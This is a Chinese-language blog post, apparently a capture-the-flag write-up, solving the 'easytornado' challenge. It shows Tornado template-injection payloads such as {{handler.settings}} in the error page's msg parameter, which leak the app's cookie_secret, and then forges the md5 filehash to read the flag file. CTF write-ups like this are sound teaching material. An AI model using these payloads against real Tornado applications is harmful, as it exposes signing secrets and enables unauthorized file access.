---
layout:     post               # 使用的布局（不需要改）
title:      easytornado    # 标题 
subtitle:    攻防世界   #副标题
date:       2020-07-20         # 时间
author:     yanmie             # 作者
header-img: img/.jpg    ##标签这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               
    - CTF
  
---

打开题目。

![Uf0O9s.png](https://s1.ax1x.com/2020/07/20/Uf0O9s.png)

打开相应文件，并观察url.

url：  `/file?filename=/flag.txt&filehash=98955d903c32a8210c3506f60e21df92`

```
/flag.txt
flag in /fllllllllllllag
```

发现flag在/fllllllllllllag文件里

url: `/file?filename=/welcome.txt&filehash=b7321be5721fe54ced42219fc947fdc4`

```
/welcome.txt
render
```

render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。

[render函数介绍](https://blog.csdn.net/qq78827534/article/details/80792514)

url: `/file?filename=/hints.txt&filehash=92c8e6d7f73110e7396ccbc4da5ee0d5`

```
/hints.txt
md5(cookie_secret+md5(filename))
```
url中filehash=md5(cookie_secret+md5(filename))
现在filename=/fllllllllllllag，只需要知道cookie_secret的就能访问flag。

现在直接把`filename`参数变为`falg`所在文件尝试。

直接跳转到error页面，url变为`/error?msg=Error`

猜测存在模板注入`ssti`攻击。

测试`/error?msg={{1}}`,页面返回1.

在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，

文档：

https://www.tornadoweb.org/en/latest/guide/templates.html#template-syntax

https://tornado-zh.readthedocs.io/zh/latest/web.html


尝试`/error?msg={{datetime}}`,页面回显：

```
<module 'datetime' from '/usr/local/lib/python2.7/lib-dynload/datetime.so'> 
```

说明是存在模板写注入的。

过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名

```
RequestHandler.settings
An alias for self.application.settings.
```

handler指向的处理当前这个页面的RequestHandler对象，

RequestHandler.settings指向self.application.settings，

因此handler.settings指向

RequestHandler.application.settings。

构造payload获取cookie_secret.`/error?msg={{handler.settings}}`

页面回显：

```
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'ad888c91-00d3-4e58-974a-2d79350474bb'} 
```

得到了`cookie_secert`,那么就可以h构造url了。

加密`/fllllllllllllag` 得到`3bf9f6cf685a6dd8defadabfb41a03a1`

加密`ad888c91-00d3-4e58-974a-2d79350474bb3bf9f6cf685a6dd8defadabfb41a03a1`,得到`0ee8e7917ecaeeb33771b5502ba983e3`.

页面回显flag。

